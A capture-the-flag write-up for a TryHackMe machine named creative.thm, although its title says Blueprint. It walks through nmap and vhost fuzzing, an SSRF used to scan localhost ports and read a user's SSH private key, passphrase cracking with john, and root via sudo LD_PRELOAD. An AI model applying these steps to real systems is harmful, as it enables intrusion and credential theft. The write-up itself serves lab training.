# 📝 Writeup – Blueprint (TryHackMe)

---
## ENUMERATION
Starting with a quick scant to find open ports. Then a detailed scan on open ports. This way it doesnt waste time running scripts on closed ports.   
```bash
nmap -p- --min-rate 2000 -vv -T4 <IP>
```   
```bash
nmap -p 22,80 -sC -sV -vv -oN scan.nmap <IP>
```   
![nmap](screenshots/nmap1.png)     
Only PORT 22,80.That version of SSH doesnt hv much So port80 we start with    

### PORT 80
We get redirected to *http://creative.thm* so add that to /etc/host `echo '<MACHINE_IP>   creative.thm'`. I did look around the website but found nothing useful even with `gobuster dir` so onto some *vhost* fuzzing.   
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://creative.thm -H "Host:FUZZ.creative.thm" -t 40 -fw 6
```   
![vhosts](screenshots/vhost_fuzz.png)   
We find *beta.creative.thm* going to that website after adding to */etc/hosts*     
![beta](screenshots/beta.png)    
Looking at the website it seems to redirect us to the website if its still active. I tried *google.com* but it returned *dead*. Crazy how about *Localhost* it does redirect to *creative.thm*. Going on with that lets see if it has any other port open on Local host(127.0.0.1). For that i tried with *burp* but its way to slow so i used *ffuf*.    
![burp](screenshots/burp.png)     
```bash
ffuf -w port.txt:FUZZ -u http://beta.creative.thm -X POST -H "Context-Type: application/x-www-form-urlencoded" -d "url=http://localhost:FUZZ" -fw 3
```   
`port.txt` -> wordlists having no.s *1-65535*. You can get that by a simple py script to print numbers in *range(1,65536)*    
`-d` -> the data to pass. url is the POST parameter(view source ull see)   
`-H` -> Header to tell its passed to form(u can see that in burp)   
`-fw` -> filter word count   
![fuzzing_ports](screenshots/port_scan.png)    
127.0.0.1:80 & 127.0.0.1:1337 are open. Port 80 is *creative.thm*, Port 1337 is hosting `/` folder. You can access by `http://localhost:1337/<directory>`. Go and get the ssh private key of *saad*. I wont be telling where it is just poke around -_-    

---
## EXPLOITATION    
### SSH
Once u get the key you'll prolly need to put it in the proper format .   
```bash
------BEGIN OPENSSH PRIVATE KEY-----
<Base64> -> 64 characters/line
------END OPENSSH PRIVATE KEY-----   
```   
How u get it in that format is up to you either a *code* or *chatgpt*. Once you get that save as *id_rsa*. 
```bash
ssh -i id_rsa saad@<MACHINE_IP>
```   
Once you do this it still asks for a passphrase for that we'll convert the bsae64 ssh key to a format *john* can read.    
```bash
ssh2john id_rsa > john.txt
```   
Now for passphrase guessing   
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt john.txt
```    
Take the passphare & login to ssh ^_^   

## PRESC 
```bash
sudo -l
```    
It'll ask for passwd & its not the ssh one. So checked a few folder & in *./bash_history* we get usefull stuff    
![sudo-l](screenshots/sudo-l.png)    
So we can run ping as root with passwd and the important one is *env_keep+=LD_PRELOAD*. Did research on LD_PRELOAD(dynamic loader) & found out it expects a *Shared object library*(.so). This is a pointer that runs whats in the shared library before the program. So u need a malicious(.so) file.     
![root](screenshots/root.png)     

---
Note📑 : Few Commands are there in [README.md](https://github.com/C1ph3r404/Creative/README.md)
